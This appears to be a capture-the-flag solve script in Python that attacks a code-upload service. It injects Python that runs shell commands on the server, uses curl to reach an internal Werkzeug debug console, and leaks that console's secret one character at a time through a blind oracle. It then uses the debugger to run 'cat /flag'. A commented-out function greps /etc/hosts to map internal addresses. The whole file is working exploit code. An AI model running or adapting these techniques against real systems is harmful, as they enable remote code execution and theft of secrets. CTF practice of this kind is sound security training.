import requests
import urllib
guess = "}_0123456789abcdefghijklmnopqrstuvwxyz"
guess1 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
flag = "FLAG{"

url = "https://pyscript.ctf.zoolab.org/"
#url = "http://172.25.140.248:8000/"          ### php 
ip = '172.26.0.3:5000'
secret = ''



def conn(url,fi):
    f = fi + open('./a','rb').read()
    files = {'file': f}
    r = requests.post(url, files=files)
    return r.text

def guess_secret():
    global secret
    global ip
    global url
    index = 10
    for _ in range(20):
        for i in guess1 :
            fi = f"i = 1 ; g = '{i}' ; i//2 ; import os ; a = os.popen(f'curl -s http://{ip}/console').read() ; i=a.find('SECRET ='); val = a[i+{index}] ; os.system('cat /flag') if val == g else print('wer')".encode()
            text = conn(url,fi)
            if 'Flag' in text :
                index += 1
                secret = secret + i
                print(secret)
                break

def guess_flag(secret):
    global flag
    global url
    index = 5
    while flag[-1] != '}':
        for i in guess :
            cmd = 'import os; x = os.popen("cat /flag").read() ; print(x)'
            url3 = f"http://{ip}/console?&__debugger__=yes&cmd={urllib.parse.quote(cmd)}&frm=0&s={secret}"
            fi = f"i = 1 ; g = '{i}' ; i//2 ; import os ; a = os.popen(f'curl -X GET -s \"{url3}\"').read() ; i = a.find('FLAG{'{'}') ; val = a[i+{index}] ; os.system('cat /flag') if val == g else print('wer')".encode()
            text = conn(url,fi)
            if 'Flag' in text :
                index += 1
                flag = flag + i
                print(flag)
                break

# def guess_ip():
#     global ip 
#     global url
#     for i in range(10) :
#         fi = f"i = 1 ; g = '{1}' ; i//2 ; import os ; a = os.popen(f'cat /etc/hosts | grep 172.{i}').read() ; os.system('cat /flag') if len(a) != 0 else print(123)".encode()
#         text = conn(url,fi)
#         if 'Flag' in text :
#             print(i)

if __name__ == '__main__':
    # guess_ip()
    guess_secret()   
    guess_flag(secret)


            